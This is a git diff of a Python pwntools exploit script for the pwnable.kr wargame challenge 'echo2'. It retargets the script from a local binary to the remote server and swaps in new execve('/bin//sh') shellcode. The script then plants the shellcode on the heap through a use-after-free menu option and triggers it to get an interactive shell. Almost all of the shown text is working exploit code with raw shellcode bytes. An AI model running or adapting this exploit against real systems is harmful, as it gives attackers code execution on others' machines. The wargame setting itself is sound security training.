@@ -1,20 +1,16 @@
 from pwn import *
 
-host = 'pwnable.kr'
 host = '0'
-#conn = connect(host, 9011)
-conn = process('./echo2')
+host = 'pwnable.kr'
+#conn = process('./echo2')
+conn = connect(host, 9011)
 
 nombre = 'physics'
 
-"""
-- 1. : BOF echo
-- 2. : FSB echo
-- 3. : UAF echo
-- 4. : exit
-"""
+
 # http://shell-storm.org/shellcode/files/shellcode-806.php
-shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+shellcode = 'A' * 4 + "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
+
 objo = 0x602098
 
 def main():
@@ -89,11 +85,13 @@ def main():
 
 	# place shellcode on heap
 	conn.sendline('3')
-	conn.sendline('A' * 4 +  shellcode)
+	conn.sendline(shellcode)
 	conn.recvuntil('> ')
 
 	# trigger shellcode
-	conn.sendline( '4\ny' )
+	conn.sendline('4')
+	conn.sendline('y')
+	conn.recvuntil('bye')
 	conn.interactive()
 
 if __name__ == '__main__':
